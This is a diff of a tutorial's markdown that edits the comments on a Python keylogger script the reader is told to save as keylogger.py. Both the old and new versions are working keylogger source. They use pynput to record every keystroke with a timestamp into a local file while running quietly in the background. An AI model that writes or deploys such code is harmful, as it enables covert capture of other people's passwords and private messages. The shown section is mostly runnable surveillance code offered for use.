@@ -52,28 +52,25 @@ pip install pynput
 Copy and save the following code as **keylogger.py**:
 
 ```python
-from pynput import keyboard
-from datetime import datetime
-import time
-def keyPressed(key):    
-    """ Handles key press events, logs the key pressed along with the timestamp. """
-    
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            # Log printable character keys with timestamp
-            char = key.char
-            logKey.write(f"{datetime.now()} - {char}\n")
-        except AttributeError:
-            # Log special keys with timestamp in brackets
-            logKey.write(f"{datetime.now()} - [{str(key)}]\n")
-
+from pynput import keyboard   # Import the keyboard listener from the pynput library
+from datetime import datetime   # Used to timestamp each keypress
+import time    # Used to keep the script running
+def keyPressed(key):    # Handles key press events, logs the key pressed along with the timestamp.
+     with open("keyfile.txt", 'a') as logKey:  # Open the log file in append mode so previous keystrokes are not overwritten
+         try:
+             # Log regular character (letters, numbers) 
+             logKey.write(f"{datetime.now()} - {key.char}\n")
+         except AttributeError:
+             # Log special keys (like Enter, Shift, etc.) with timestamp in brackets
+             logKey.write(f"{datetime.now()} - [{key.name}]\n")
+ 
 if __name__ == "__main__":
-    # Initialize the key listener
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()  # Start listening
-    # Keep the script running quietly in the background
-    while True:
-        time.sleep(1)
+     # Start listening for key presses
+     listener = keyboard.Listener(on_press=keyPressed)
+     listener.start()  # Start listening
+     # Keep the script running quietly in the background
+     while True:
+         time.sleep(1) # Sleep to prevent high CPU usage
 ```
 
 #### **Run the Keylogger:**  
